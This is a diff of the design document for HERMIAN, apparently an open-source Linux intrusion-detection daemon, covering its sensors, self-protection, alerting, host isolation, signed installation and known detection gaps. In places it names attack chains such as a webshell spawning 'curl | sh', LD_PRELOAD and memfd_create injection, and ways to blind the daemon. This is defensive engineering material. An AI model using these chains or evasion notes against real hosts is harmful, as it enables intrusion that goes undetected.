+| listeners | /proc/net/tcp and tcp6 every 5 s | owner pid resolved through /proc/*/fd in one pass |
+| setuid files | filesystem sweep every 20 s, depth 4 | |
+| auth | PAM module, or auth.log/secure, or `journalctl -f` | picked at startup, shown in `hermian status` |
+| exec fallback | NETLINK_AUDIT | only when eBPF is unavailable and no auditd is running; installs an execve/execveat rule, parses the text records, removes the rule on exit |
 
-**eBPF is a tool, not a requirement.** Where a reliable, cheaper signal exists (inotify for file changes, `/proc` for process metadata), it is preferred. eBPF is used where it provides unique visibility (syscall-level events, cross-process tracking) that cannot be reliably obtained otherwise.
+eBPF is used where nothing else gives the same fact. inotify is cheaper for
+files, /proc is fine for metadata. On kernels before 5.8, or when the eBPF
+load fails, the daemon runs on /proc polling plus audit and says so in
+`status`.
 
-**Minimum kernel version for full eBPF capability:** 5.8  
-**Graceful degradation:** on kernels < 5.8, HERMIAN falls back to `/proc` polling and netlink audit for events it cannot obtain via eBPF. Reduced coverage is logged and surfaced in `hermian status`.
+## Containers
 
----
+A pid is "in a container" if its pid namespace differs from PID 1's or its
+cgroup names a runtime. Events carry `container` and, where parseable,
+`container_id`. Persistence rules skip paths under docker, containerd and
+podman overlays. A container's own PID 1 spawning a shell is not a web-shell.
 
-## 14. Container and namespace awareness
+That's the extent of it. Runtime integration and anything Kubernetes-shaped
+is not planned for the standalone agent.
 
-Container environments break several assumptions that host-based detection relies on:
+## Self-protection
 
-| Assumption | Breaks when |
-|---|---|
-| PID 1 is init/systemd | Container PID namespacing |
-| `/proc/<pid>/exe` is meaningful | Overlayfs, deleted-after-exec binaries |
-| Parent PID chain is stable | `docker run` wraps everything under containerd |
-| Network connections come from the process | Container network namespacing |
+The daemon is root with eBPF, and an attacker who quiets it wins. So:
 
-**HERMIAN MVP requirements for container awareness:**
+- Config and binary are hashed at `enable` time and checked at every start.
+  Mismatch is CRITICAL before anything else runs.
+- The config file is watched. A change is parsed and validated; if valid it's
+  applied and a CRITICAL says what changed; if invalid the old config stays
+  and a CRITICAL says so. `systemctl reload` does the same on demand.
+- The systemd unit runs with `ProtectSystem=strict`, `NoNewPrivileges`,
+  `RestrictNamespaces`, `RestrictSUIDSGID`, `LockPersonality`,
+  `ProtectKernel*`, and only these capabilities: `CAP_SYS_ADMIN CAP_BPF
+  CAP_PERFMON CAP_NET_RAW CAP_SYS_PTRACE CAP_DAC_READ_SEARCH
+  CAP_AUDIT_CONTROL CAP_AUDIT_READ`, plus `CAP_NET_ADMIN` only when isolation
+  is configured. `PrivateTmp` is off on purpose (it hid /tmp from the setuid
+  sweeper) and `MemoryDenyWriteExecute` is off because the perf ring buffer
+  needs a writable shared mapping.
+- State, logs and config are root-owned, mode 0600/0700, written atomically.
+- `hermian status` reports inotify watch health. Zero watches with D3 enabled
+  shows as DEGRADED, because it happened on the first test host (another
+  process had exhausted the kernel's watch limit) and status said everything
+  was fine.
+- Updates come only through signed releases. Nothing auto-updates.
+- `hermian uninstall` removes the unit, state, logs, sysctl file, PAM hook and
+  binary, and lifts isolation first if it's on.
 
-1. Detect when a PID is inside a container namespace via `/proc/<pid>/cgroup` and `/proc/<pid>/ns/pid`.
-2. Tag all events with `container: true/false` and, where detectable, `container_id`.
-3. Do not fire D3 (persistence) alerts for paths inside container overlayfs layers — these are not host persistence.
-4. Apply separate process chain rules for container-spawned processes to reduce false positives from container entrypoints.
+Not done: watching the unit file, the state directory and the stored hashes
+themselves; a process that kills the daemon is only visible as a systemd
+restart.
 
-Full container-native detection (Kubernetes admission, container runtime integration) is a post-MVP capability.
+## Notifications
 
----
+`journald` and `/var/log/hermian/alerts.log` get every alert. The channels
+below get alerts at or above `min_severity` (HIGH by default):
 
-## 15. HERMIAN self-protection
-
-HERMIAN runs with elevated privileges and has network access. It is a high-value target. An attacker who compromises or disables HERMIAN gains silent operation.
-
-### Requirements
-
-**Configuration integrity:**
-- HERMIAN configuration is hashed on startup.
-- Any modification to the config file while the daemon is running triggers a CRITICAL alert and config reload.
-- Configuration is stored with `600` permissions, owned by root.
-
-**Binary integrity:**
-- On startup, HERMIAN verifies its own binary against a stored hash.
-- Unexpected binary modification triggers an alert before continuing.
-
-**Process protection:**
-- HERMIAN monitors for unexpected signals to its own PID.
-- HERMIAN does not exclude itself from its own detection — if HERMIAN is used as a persistence mechanism, that should be detectable.
-
-**Anti-tampering:**
-- The HERMIAN systemd unit uses `ProtectSystem=strict`, `PrivateTmp=true`, `NoNewPrivileges=true` where compatible with required capabilities.
-- Capabilities are scoped minimally: `CAP_SYS_ADMIN` for eBPF, `CAP_NET_ADMIN` only if network isolation response is enabled.
-
-**Secure update:**
-- Updates are delivered via signed packages or a signed binary with GPG/sigstore verification.
-- No auto-update without explicit user opt-in.
-- Update channel is configurable (stable/beta).
-
-**Uninstall:**
-- `sudo hermian uninstall` cleanly removes the daemon, systemd unit, config, and log files.
-- The uninstall process must not leave privileged orphan processes.
-
----
-
-## 16. Notifications
-
-HERMIAN must work for months without a user opening a browser. The notification is the product.
-
-**Supported channels (Phase 4):**
-
-| Channel | Priority |
-|---|---|
-| Local terminal / journald | Phase 1 (MVP) |
-| Email (SMTP) | Phase 4 |
-| Telegram | Phase 4 |
-| Slack webhook | Phase 4 |
-| Generic webhook | Phase 4 |
-| Optional web console | Phase 6 |
-
-**Delivery guarantees:**
-
-- Notifications are queued locally with retry on failure.
-- Delivery failures are logged and surfaced in `hermian status`.
-- A notification that fails to deliver for > 15 minutes generates a local CRITICAL log entry.
-
-**Alert deduplication:**
-
-- Repeated identical events within a configurable window (default: 5 minutes) are grouped into a single notification.
-- The notification reports: "This pattern repeated N times in the last 5 minutes."
-
----
-
-## 17. Response model
-
-HERMIAN is **passive by default.**
-
-| Action | Default | Requires explicit enable |
+| Channel | Transport | Notes |
 |---|---|---|
-| Log event | Always on | — |
-| Notify | On for HIGH/CRITICAL | — |
-| Collect additional context | Manual via `hermian collect <ref>` | — |
-| Block specific connection | Off | Yes |
-| Isolate host | Off | Yes |
+| telegram | Bot API, HTML | sound only for CRITICAL by default; token redacted from errors |
+| email | SMTP with STARTTLS, TLS or none; or the host's sendmail | text plus HTML multipart, filter-friendly subject |
+| webhook | HTTPS POST | generic JSON, Slack, Discord or ntfy payloads |
+| stdout | | for running in the foreground |
 
-**Host isolation:**
+Delivery is queued (500 alerts max), retried with backoff from 5 s to 2 min,
+and tracked per channel so a Telegram failure never re-sends the email. After
+15 minutes of failure a CRITICAL is logged locally. `status` shows the queue
+depth, the last error and deliveries per channel. `hermian notify-test`
+probes each configured channel and sends one test alert.
 
-When enabled, isolation:
-- Uses `nftables`/`iptables` rules to block all inbound/outbound except the configured management interface and port.
-- Preserves a recovery path: the management SSH source is always exempted.
-- Is reversible: `sudo hermian unisolate`.
-- Is never triggered automatically on CRITICAL without `--auto-isolate` being explicitly set in config.
+## Response
 
-**HERMIAN never performs destructive remediation automatically.**
+Passive by default. The daemon logs and notifies; it does not kill, block,
+or quarantine anything on its own.
 
-A wrong isolation that locks an admin out of production is an unacceptable outcome. Every active response requires either manual invocation or explicit, documented opt-in.
+`hermian isolate` installs an nftables table that drops everything except
+loopback, established flows, DNS, and the CIDRs in
+`response.management_cidrs`. `hermian unisolate` removes it. With
+`response.auto_isolate = true` (which the config validator refuses unless
+management CIDRs are set) a CRITICAL triggers isolation automatically.
 
----
+The failure mode is locking an operator out of production. So isolation
+requires two deliberate config choices, always leaves the management network
+reachable, and is undone by uninstall.
 
-## 18. Security principles
-
-| Principle | Implementation |
-|---|---|
-| Minimal privileges | Drop capabilities not required at runtime |
-| Secure update | Signed packages, GPG/sigstore, no silent auto-update |
-| Signed binaries | All release artifacts signed, signatures published |
-| Config integrity | Hash on startup, monitor for modification |
-| Binary integrity | Hash on startup |
-| Auth for control ops | `hermian` CLI requires root or `hermian` group membership |
-| Minimal attack surface | No network listener by default; agent connects out only |
-| Fail-safe | On internal error, log and alert but do not crash silently |
-| Clean uninstall | Full removal path, no orphaned privileged processes |
-| No unnecessary secrets | HERMIAN does not read, store, or transmit passwords, API keys, or session tokens |
-| No production config changes | HERMIAN never modifies the system configuration it monitors |
-
----
-
-## 19. Installation
-
-### Target experience
+## Installation and packaging
 
 ```bash
-# Via package manager (preferred)
-sudo apt install hermian
+# verify: every release is signed with Sigstore, keyless, bound to this repo's workflow
+cosign verify-blob SHA256SUMS --bundle SHA256SUMS.sigstore \
+  --certificate-identity-regexp '^https://github.com/hermian-security/hermian/' \
+  --certificate-oidc-issuer https://token.actions.githubusercontent.com
+sha256sum -c SHA256SUMS --ignore-missing
 
-# Enable and start
-sudo hermian enable
-
-# Check status
+sudo apt install ./hermian_0.1.0-1_amd64.deb     # runs `hermian enable` for you
 sudo hermian status
 ```
 
-Expected output of `hermian status`:
+`curl | sudo sh` is not offered and won't be. Piping an unverified script to
+root is the sort of thing HERMIAN exists to catch.
 
-```
-HERMIAN v1.0.0 — active
+Shipped today: `.deb` for amd64 and arm64, a tarball with `install.sh` for
+other systemd distros, checksums, Sigstore bundles. Built on Ubuntu 22.04 so
+the glibc requirement is 2.34. `.rpm` and an AUR package come after a
+Fedora and Arch burn-in. There's no GPG key; if a distro repository needs
+one later it will be generated offline and published alongside.
 
-Host:            web-prod-01
-Uptime:          3d 14h 22m
-Kernel:          6.1.0 (eBPF full)
-Baseline period: complete
-
-Protection status:
-  Process chains ............. active (eBPF)
-  SSH / auth ................. active (PAM + inotify)
-  Persistence ................ active (inotify)
-  Privilege escalation ....... active (eBPF)
-  Network correlation ........ active (eBPF)
-
-Overhead (last 1h):
-  CPU avg .................... 0.3%
-  RSS ........................ 47 MB
-  Events processed ........... 14,203
-  Alerts generated ........... 0
-
-Notifications:
-  Channel .................... Telegram
-  Last delivery .............. 3d ago (test alert on install)
-  Failures ................... 0
-```
-
-### Package distribution
-
-- Primary: `.deb` (Debian/Ubuntu), `.rpm` (Fedora/RHEL/CentOS), `PKGBUILD` (Arch AUR)
-- Secondary: signed tarball with manual install script
-- All packages and binaries signed with a published GPG key
-- Key fingerprint published on the project website, GitHub, and a Sigstore transparency log
+`hermian enable` writes the unit with the real binary path, creates the state
+directories, records the integrity hashes, starts the baseline clock, raises
+`fs.inotify.max_user_watches` if it's low, and starts the daemon. It's
+idempotent and is how upgrades work too.
 
 ---
 
-## 20. Project phases
+## Where we are
 
-### Phase 0 — Detection research (current)
+**Done** (v0.1.0-beta): everything in this document not marked otherwise.
+Tested on one host. Details and the bugs it surfaced are in
+`docs/ROADMAP-BURN-IN.md`.
 
-**Goal:** Validate the MVP detection set before writing a line of daemon code.
+**Next**, in order:
 
-**Output:**
+1. Make the release workflow produce a verified artifact on a tag.
+2. Burn in on Debian 12, Fedora with SELinux, kernel 5.4, arm64, a web host
+   under load, a workstation, an Ansible-managed host, a CI runner. 72 hours
+   each. Fix what breaks. Publish the false-positive log.
+3. `hermian dismiss <ref> [--allow]` and `hermian stats`, so suppression is a
+   command and false-positive rates are a number.
+4. Baseline learning for `(parent, /tmp path)` pairs, so the one HIGH the
+   unattended workload produced becomes a learned fact rather than a rule
+   demotion.
+5. Log rotation and alert pruning.
+6. A file-write eBPF hook, so session attribution stops guessing.
 
-- Detection catalog with false-positive risk assessment (this document, Section 7–8)
-- Test scenario suite for each detection
-- Benchmark baseline for target hardware
-- Data source feasibility for each detection on Linux 5.x and 6.x
+**Later**: `.rpm`, AUR, an optional hosted relay for people who don't want to
+run a bot or an SMTP account (alerts only, never events; the agent must keep
+working without it), a read-only fleet page on top of that, cross-host
+correlation. Windows and macOS after all of it.
 
-**Constraint:** No production code. No UI. No cloud.
+## Targets
 
----
-
-### Phase 1 — Linux MVP
-
-**Implement:**
-
-- Rust daemon with eBPF (aya-rs)
-- D1–D5 detections
-- Local alert engine with journald output
-- CLI (`hermian enable`, `hermian status`, `hermian test`, `hermian collect`)
-- Configuration with sane defaults + allowlist support
-- Baseline period for SSH sources
-- Signed package for Debian/Ubuntu
-
-**Target:** `install → enable → forget`
-
----
-
-### Phase 2 — Real-world validation
-
-**Test against:**
-
-- Idle server
-- Active web server (nginx, Apache)
-- Developer workstation (build tools, Docker, IDE)
-- SSH-active server
-- CI/CD host
-- Containerized workload host
-- Homelabs
-
-**Simulate:**
-
-- Webshell RCE chain
-- SSH key injection
-- Cron persistence
-- LD_PRELOAD injection
-- Systemd service persistence
-- Brute-force + credential success
-- Fileless exec via `memfd_create`
-
-**Measure CPU, RAM, event volume, false positives, detection latency for each scenario.**
-
-Validation is gated — Phase 3 does not start until:
-- All 5 detection groups pass the false-positive test suite
-- CPU < 1% and RSS < 80 MB on all test environments
-- All HIGH/CRITICAL simulated attacks detected within 5 seconds
-
----
-
-### Phase 3 — RPM packaging and additional distros
-
-- `.rpm` package for Fedora/RHEL
-- `PKGBUILD` for Arch
-- Signed binary tarball for distro-agnostic install
-- Test on Linux 5.4 LTS (minimum supported kernel)
-
----
-
-### Phase 4 — Notification ecosystem
-
-- Email (SMTP)
-- Telegram bot
-- Slack webhook
-- Generic webhook
-- Alert deduplication
-- Notification queue with retry
-
----
-
-### Phase 5 — Windows
-
-Add Windows agent. Maintain the same user experience.
-
-Detection priority:
-
-- Authentication events (Windows Security Log)
-- PowerShell execution monitoring (ETW / Script Block Logging)
-- Suspicious process chains
-- Scheduled Task persistence
-- Service persistence
-- Registry Run key persistence
-- WMI persistence
-- RDP-related security changes
-- Local administrator changes
-
-No kernel driver unless a concrete detection requirement cannot be satisfied otherwise.
-
----
-
-### Phase 6 — Optional central management
-
-Only after the standalone agent is validated in production.
-
-- Fleet status overview
-- Centralized alert history
-- Multi-host correlation (lateral movement signals)
-- Central policy distribution
-- Asset inventory
-
-This is an extension. The standalone agent must work without it.
-
----
-
-### Phase 7 — macOS
-
-- EndpointSecurity API (system extension, no deprecated kexts)
-- Focus: LaunchAgents/Daemons, SSH key injection, process chains, auth events
-
----
-
-## 21. KPIs and benchmark methodology
-
-### Benchmark environments
-
-| Label | Spec | Workload |
+| | Target | First host |
 |---|---|---|
-| `server-idle` | 2 vCPU, 2 GB RAM (t3.small equivalent) | Systemd, cron, sshd — no active users |
-| `server-web` | 2 vCPU, 4 GB RAM | nginx + PHP-FPM, 100 req/s via wrk |
-| `server-ci` | 4 vCPU, 8 GB RAM | GitHub Actions runner, parallel builds |
-| `workstation` | 4 vCPU, 8 GB RAM | VSCode, Docker, terminal, browser |
+| CPU average | < 1% | 0.1% |
+| CPU p99 | < 5% | 0.13% |
+| RSS | < 80 MB | 19 MB |
+| event to notification, HIGH+ | < 5 s | ~2 s |
+| false HIGH+ | < 1 per host per month | 0 in 26 operations plus soak |
+| simulated attacks caught | > 95% | 13/13 |
+| crashes | 0 | 0 |
 
-All benchmarks run for **72 hours** minimum. CPU and RSS are sampled every 30 seconds. p99 values are reported alongside averages.
+Benchmarks run 72 hours on a 2 vCPU idle server, a 2 vCPU web server at 100
+req/s, a 4 vCPU CI host and a 4 vCPU workstation, sampled every 30 s. Event
+volume is not a target; it's a number we watch so we notice when it changes.
 
-### Performance KPIs
+## How we work
 
-| KPI | Target | Measurement |
-|---|---|---|
-| CPU average | < 1% | `ps` / cgroup cpu.stat over 72h |
-| CPU p99 spike | < 5% | Captured per 30s sample |
-| RSS steady-state | < 80 MB | `smaps_rollup` |
-| Detection latency (HIGH/CRITICAL) | < 5s | Time from execve to notification delivery |
-| Event throughput | Process > 10,000 events/s without dropped events | Synthetic load test |
+Build the smallest thing that's useful. Add a technology only when a
+measurement says the simple version fails. Every rule ships with a simulated
+attack that trips it and a normal-work suite that doesn't. Ten rules that
+stay quiet beat five hundred nobody reads. Normal administration is not an
+attack, and the test suite says so in code. Any active response has to be
+safe when it fires by mistake, or it stays advisory. The terminal is the
+product; the first thing a user should see is `hermian status` saying
+PROTECTED and nothing else.
 
-### Detection KPIs
+## Known hard problems
 
-| KPI | Target |
-|---|---|
-| False HIGH/CRITICAL rate | < 1 per host per month on realistic workloads |
-| Detection rate — simulated attack scenarios | > 95% |
-| Missed detections | Tracked per scenario, published |
-| Detection latency — HIGH/CRITICAL | < 5s median, < 10s p99 |
+Written down so nobody, including us, mistakes the current coverage for
+completeness.
 
-### Reliability KPIs
+**Living off the land.** An attacker using python, curl, openssl or bash
+leaves no odd process name. We catch it when the parent is wrong (nginx ->
+bash) or the location is (exec from /tmp). We don't catch a cron job that
+runs a legitimate-looking python script that does bad things. That needs
+argument inspection and per-host behavioural baselines.
 
-| KPI | Target |
-|---|---|
-| Agent uptime | > 99.9% (< 9h downtime/year) |
-| Notification delivery success | > 99% (with retry) |
-| Crash-free rate | 100% (panics are bugs, not expected) |
+**Injection without exec.** `ptrace` writes, `/proc/pid/mem`, shared-library
+injection: no new process, no exec event. We see the ptrace attach. We don't
+see what it did.
 
-### Anti-vanity rule
+**Attribution.** Layer 3 of session attribution is a guess. A long-lived tmux
+session on a server makes unattended writes look attended. The fix is a
+kernel-side file-write hook with the writer's pid; it's on the list.
 
-Event collection volume is **not a KPI.** The number of events processed is an operational metric, not a product success metric.
+**The daemon itself.** A root process that kills HERMIAN is only visible as a
+restart. An attacker who edits the stored hash file and the binary together
+defeats the integrity check. Both need the hashes to live somewhere the
+daemon's own privileges can't reach, or a second observer.
 
----
+**Containers.** Ancestry through containerd shims, overlayfs paths that don't
+exist on the host, network namespaces where the connect comes from a
+different netns than the process. We tag and exempt; we don't yet reason
+about it.
 
-## 22. MVP success criteria
-
-HERMIAN MVP is complete when all of the following are true:
-
-**For a non-security user:**
-
-```
-Install in < 3 minutes
-  ↓
-Run normally for 72 hours — zero false HIGH/CRITICAL alerts
-  ↓
-Simulate webshell RCE (nginx → bash → curl | sh)
-  ↓
-CRITICAL alert delivered in < 5 seconds
-  ↓
-Alert is self-explanatory with no prior security knowledge
-```
-
-**For a sysadmin:**
-
-- Deploys to a production server without modifying system configuration
-- Generates zero alerts during normal Ansible runs (with appropriate allowlist)
-- CPU overhead invisible under production load
-- Can be fully uninstalled with one command
-
-**For the project:**
-
-- All 5 detection groups pass false-positive test suite
-- CPU and memory targets met on all benchmark environments
-- Binary signed, reproducible build documented
-- Uninstall path tested and verified
-
----
-
-## 23. Way of work
-
-### Rule 1 — Build the smallest useful thing
-
-Before adding any feature, ask:
-
-> Does this directly improve detection quality, alert clarity, or safe response capability?
-
-If not, it is deferred.
-
-### Rule 2 — No technology without a measurable problem
-
-Do not introduce Kafka, Kubernetes, graph databases, ML pipelines, or microservices without a benchmark that shows the simpler approach fails to meet a specific requirement.
-
-### Rule 3 — Measure before shipping a detection
-
-Every detection needs:
-- A true-positive test case (simulated attack)
-- A false-positive test suite (realistic normal workloads)
-- CPU and RAM impact measured
-
-A detection that fails the false-positive suite is not shipped.
-
-### Rule 4 — Quality over quantity
-
-10 detections with < 1 false positive/month is more valuable than 500 detections reviewed by nobody because the noise is unbearable.
-
-### Rule 5 — Normal administration is not an attack
-
-Every detection must be tested against:
-- Developers using SSH interactively
-- Admins running Ansible/Puppet/Chef
-- Package manager operations
-- CI/CD pipelines
-- Backup jobs
-- Monitoring agents
-
-### Rule 6 — Active response must survive being wrong
-
-Before shipping any active response capability, answer:
-
-> What happens if HERMIAN fires this incorrectly on a production system?
-
-If the answer is unacceptable, the response is advisory-only until the false-positive rate is demonstrated to justify it.
-
-### Rule 7 — The terminal output is the product
-
-The first successful user experience is:
-
-```
-$ sudo hermian status
-
-HERMIAN active. No alerts. Your system is being monitored.
-```
-
-Not a web application.
-
----
-
-## 24. Long-term vision
-
-HERMIAN evolves from a host security daemon into a quiet defensive layer for infrastructure.
-
-The principle does not change:
-
-> Observe less.  
-> Understand more.  
-> Alert rarely.  
-> Explain clearly.  
-> Act safely.
-
-The product becomes more capable without becoming more complicated for the person using it.
-
----
-
-## One-sentence definition
-
-HERMIAN is a lightweight Linux security daemon that detects high-confidence signs of compromise using deterministic, contextual detection and only interrupts the operator when something genuinely requires attention.
+**Across hosts.** Lateral movement doesn't produce a suspicious chain on the
+source host. Seeing it needs alerts from several hosts in one place, which is
+the hosted relay's job, later.
